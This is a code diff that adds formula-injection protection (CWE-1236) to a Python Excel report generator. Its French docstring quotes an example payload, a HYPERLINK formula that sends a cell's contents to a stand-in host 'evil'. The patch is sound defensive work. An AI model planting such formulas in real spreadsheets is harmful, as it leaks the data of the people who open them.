@@ -6,6 +6,28 @@ from openpyxl.styles import Font, PatternFill, Alignment
 from openpyxl.utils.dataframe import dataframe_to_rows
 import pandas as pd
 
+FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
+    """Empêche l'injection de formule CSV/Excel (CWE-1236).
+
+    Les valeurs de catégorie du CSV téléversé par l'utilisateur (ex. une
+    valeur de la colonne "plateforme") se retrouvent telles quelles dans les
+    onglets générés par build_node/test_node -- une cellule commençant par
+    =, +, -, @, tab ou retour chariot serait interprétée comme une formule
+    par Excel à l'ouverture (ex. `=HYPERLINK("http://evil/"&A1)`). Même
+    garde que app_utils.neutralize_formulas, dupliquée ici plutôt
+    qu'importée pour ne pas faire dépendre le package agent de l'app
+    Streamlit.
+    """
+    df = df.copy()
+    for col in df.select_dtypes(include=["object", "str"]).columns:
+        df[col] = df[col].map(
+            lambda v: f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
+        )
+    return df
+
 
 class ExcelGenerator:
     """
@@ -41,9 +63,9 @@ class ExcelGenerator:
         """Ajoute une feuille avec des données et optionnellement un graphique."""
         title = self._unique_sheet_title(title)
         ws = self.wb.create_sheet(title=title)
-        
+
         # Ajouter les données
-        for row in dataframe_to_rows(df, index=False, header=True):
+        for row in dataframe_to_rows(_neutralize_formulas(df), index=False, header=True):
             ws.append(row)
         
         # Styliser l'en-tête
